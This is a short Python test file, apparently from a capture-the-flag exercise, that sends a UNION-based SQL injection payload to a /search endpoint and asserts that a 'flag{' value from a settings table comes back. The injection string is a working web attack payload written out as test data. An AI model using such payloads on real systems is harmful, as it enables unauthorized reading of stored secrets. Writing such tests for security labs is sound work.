import requests


def test_query_boundary_reaches_protected_record(base_url):
    payload = "%' UNION SELECT 0, key, 'config', value FROM settings -- "
    response = requests.get(base_url + "/search", params={"q": payload, "format": "json"})
    assert response.status_code == 200
    assert any(item.get("status", "").startswith("flag{") for item in response.json()["items"])
